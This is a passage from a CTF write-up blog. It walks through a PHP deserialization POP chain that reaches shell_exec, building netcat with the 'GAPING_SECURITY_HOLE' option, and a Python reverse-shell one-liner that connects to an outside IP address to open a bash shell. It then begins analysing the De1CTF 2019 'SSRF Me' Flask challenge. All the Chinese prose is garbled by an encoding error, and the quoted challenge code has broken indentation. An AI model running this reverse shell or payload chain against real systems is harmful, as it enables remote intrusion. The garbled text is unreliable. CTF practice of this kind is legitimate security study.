<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$param</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            &#123;</span><br><span class="line">                $A3 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                $A3();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $C1;</span><br><span class="line">    <span class="keyword">public</span> $C2;</span><br><span class="line">    <span class="keyword">public</span> $C3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C2 = <span class="keyword">$this</span>-&gt;C3.<span class="keyword">$this</span>-&gt;C1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶A2[godmi]ä¾¿å¯æ§åˆ¶A3ä¸ºCçš„å®ä¾‹åŒ–ï¼Œä»¥<strong>å‡½æ•°æ–¹æ³•è°ƒç”¨Cç±»</strong>ï¼Œè¿™é‡Œå°±ä¼šè§¦å‘__invokeæ–¹æ³•ã€‚è€Œèµ‹å€¼æ“ä½œä¸­æœ‰ä¸€ä¸ªæ‹¼æ¥ï¼ŒæŒ‰å­—ç¬¦ä¸²å½¢å¼å¤„ç†ï¼Œå¯ä»¥è§¦å‘Eçš„<strong>__toString</strong>æ–¹æ³•ã€‚</p>
<p>B(destruct)-&gt;A(call)-&gt;A(get)-&gt;A(call)-&gt;C(invoke)-&gt;E(tostring)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;E1-&gt;&#123;<span class="keyword">$this</span>-&gt;E2&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶E1å’ŒE2ï¼Œå°±å¯ä»¥è°ƒç”¨Dä¸­çš„FLAGæ–¹æ³•äº†ï¼</p>
<p>popï¼š</p>
<p>B(destruct)-&gt;A(call)-&gt;A(call)-&gt;C(invoke)-&gt;E(tostring)-&gt;D(FLAG)-&gt;shell_exec()</p>
<p>æ„é€ ååºåˆ—åŒ–ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$c=<span class="keyword">new</span> C();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$e=<span class="keyword">new</span> E();</span><br><span class="line">$d=<span class="keyword">new</span> D();</span><br><span class="line"></span><br><span class="line">$d-&gt;D1=<span class="string">&#x27;ä½ çš„å‘½ä»¤&#x27;</span>;</span><br><span class="line">$e-&gt;E1=$d;</span><br><span class="line">$e-&gt;E2=<span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line">$c-&gt;C1=$e;</span><br><span class="line">$a-&gt;A2[<span class="string">&#x27;godmi&#x27;</span>]=$c;</span><br><span class="line">$b-&gt;B1=$a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å·®ä¸å¤šäº†ï¼Œå¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼Œè™½è¯´åæ¥æ¢æˆäº†systemâ€¦â€¦</p>
<p>ä¸‹é¢æ˜¯æˆ‘ç”¨shell_execå¼¹shellçš„è¿‡ç¨‹ï¼Œå¡äº†ä¸¤å¤©æ‰çŸ¥é“è¦ç”¨å…¬ç½‘IPâ€¦â€¦æœç„¶è¿˜æ˜¯caiâ€¦â€¦</p>
<h4 id="æœåŠ¡å™¨éƒ¨ç½²netcatï¼š"><a href="#æœåŠ¡å™¨éƒ¨ç½²netcatï¼š" class="headerlink" title="æœåŠ¡å™¨éƒ¨ç½²netcatï¼š"></a>æœåŠ¡å™¨éƒ¨ç½²netcatï¼š</h4><p>ç¿»äº†å¥½å‡ ä¸ªåšå®¢æ€»ç»“çš„ï¼Œç”¨èµ·æ¥å¾ˆä¸æ»‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è½½æºç åŒ…ï¼šwget https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;netcat&#x2F;files&#x2F;netcat&#x2F;0.7.1&#x2F;netcat-0.7.1.tar.gz</span><br><span class="line"></span><br><span class="line">è§£å‹å®‰è£…åŒ…ï¼Œtar -zxvf netcat-0.7.1.tar.gz</span><br><span class="line"></span><br><span class="line">ç§»åŠ¨æ–‡ä»¶åˆ°&#x2F;usr&#x2F;localä¸‹ï¼š</span><br><span class="line">mv netcat-0.7.1 &#x2F;usr&#x2F;local&#x2F;netcat-0.7.1</span><br><span class="line"></span><br><span class="line">é‡å‘½åï¼š</span><br><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line"></span><br><span class="line">.&#x2F;configure  --enable-DGAPING_SECURITY_HOLE</span><br><span class="line"></span><br><span class="line">ç¼–è¯‘ï¼šmake</span><br><span class="line"></span><br><span class="line">å®‰è£…ï¼šmake install</span><br><span class="line"></span><br><span class="line">ç¯å¢ƒå˜é‡æš‚æ—¶æœªé…ç½®æˆåŠŸï¼Œä½†ä»å¯ä½¿ç”¨ï¼Œæ­¤æ—¶ï¼š</span><br><span class="line">sudo which nc åº”å¯ä»¥çœ‹åˆ° bin&#x2F;nc</span><br><span class="line">ä½¿ç”¨bin&#x2F;ncå³å¯ä½¿ç”¨ncå‘½ä»¤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">wget https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;netcat&#x2F;files&#x2F;netcat&#x2F;0.7.1&#x2F;netcat-0.7.1.tar.gz</span><br><span class="line">tar zxvf netcat-0.7.1.tar.gz</span><br><span class="line">cd netcat-0.7.1</span><br><span class="line">.&#x2F;configure  --enable-DGAPING_SECURITY_HOLE</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>ï¼š</p>
<img src="/images/1/image-20210326222805812.png" alt="image-20210326222805812" style="zoom:80%;" />

<h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><p>è™½è¯´é¶æœºä¸Šæœ‰ncï¼Œä½†ä¸€ç›´æ²¡æœ‰æˆåŠŸâ€¦â€¦</p>
<p>è¿™é‡Œæ¨èï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5768#toc-3">https://xz.aliyun.com/t/5768#toc-3</a> å¾ˆè¯¦ç»†</p>
<p>phpä¹Ÿå¯åå¼¹ï¼Œä½†æ˜¯æ˜¯ç¬é—´åå¼¹â€¦â€¦è¿™é‡Œç”¨çš„æ˜¯pythonåå¼¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;139.224.100.60&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿œç¨‹æœåŠ¡å™¨ç›‘å¬4444ç«¯å£ï¼š</p>
<p><img src="/images/1/image-20210326223239023.png" alt="image-20210326223239023"></p>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/images/1/image-20210326223300541.png" alt="image-20210326223300541"></p>
<p>æ‰§è¡Œå‘½ä»¤cat flagå³å¯â€¦â€¦</p>
<p><strong>å¥½è€¶ï¼ç™½å«–é˜¿é‡Œäº‘æœåŠ¡å™¨çœŸé¦™ï¼ï¼ğŸ•</strong></p>
<blockquote>
<p>It is uneasy right??!</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/21/De1CTF-2019-SSRF-Me/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/21/De1CTF-2019-SSRF-Me/" class="post-title-link" itemprop="url">De1CTF-2019-SSRF-Me</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-21 09:55:50 / ä¿®æ”¹æ—¶é—´ï¼š11:04:57" itemprop="dateCreated datePublished" datetime="2021-03-21T09:55:50+08:00">2021-03-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><h4 id="1-é¢˜ç›®ï¼š"><a href="#1-é¢˜ç›®ï¼š" class="headerlink" title="1.é¢˜ç›®ï¼š"></a>1.é¢˜ç›®ï¼š</h4><h4 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h4><p>è¿›å…¥é¢˜ç›®ï¼Œå¤§æ¦‚æ˜¯ä¸€å¨pythonçš„ä»£ç â€¦â€¦æ‹–åˆ°ç¼–è¯‘å™¨é‡Œæ‰‹åŠ¨æ ¼å¼åŒ–ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">    <span class="keyword">if</span><span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">        tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> resp</span><br><span class="line"></span><br><span class="line">tmpfile.write(resp)</span><br><span class="line">tmpfile.close()</span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> <span class="keyword">else</span>:</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">if</span>(getSign(self.action, self.param) == self.sign):</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> action = <span class="string">&quot;scan&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> <span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line"> check = param.strip().lower()</span><br><span class="line"> <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.debug = <span class="literal">False</span></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿˜æ˜¯æŒºä¹±çš„â€¦â€¦èƒ½çœ‹æ‡‚å°±è¡Œâ€¦â€¦</p>
</blockquote>
<p>å…ˆçœ‹è·¯ç”±ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> â€»action = <span class="string">&quot;scan&quot;</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†getSignï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè®¿é—®/geneSignï¼Œä¼šæ ¹æ®secert_keyã€paramã€actionç”ŸæˆMD5çš„ç­¾å</p>
<p>actionçš„é»˜è®¤å€¼ä¸º<strong>scan</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> â€»<span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> â€»task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br></pre></td></tr></table></figure>

<p><strong>walfï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line"> check = param.strip().lower()</span><br><span class="line"> <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>class taskå’ŒExecï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">â€»<span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">    <span class="keyword">if</span><span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">        tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> resp</span><br><span class="line">tmpfile.write(resp)</span><br><span class="line">tmpfile.close()</span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> <span class="keyword">else</span>:</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>åœ¨æ ¸å¯¹ç­¾ååï¼Œå¦‚æœscanåœ¨actionä¸­ï¼Œåˆ™scanè¯»å–paramå¹¶å­˜æ”¾åˆ°result.txtä¸­</p>
<p>å¦‚æœreadåœ¨actionä¸­ï¼Œåˆ™readè¯»å–å¹¶æ˜¾ç¤ºresult.txtâ€¦â€¦å¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€</p>
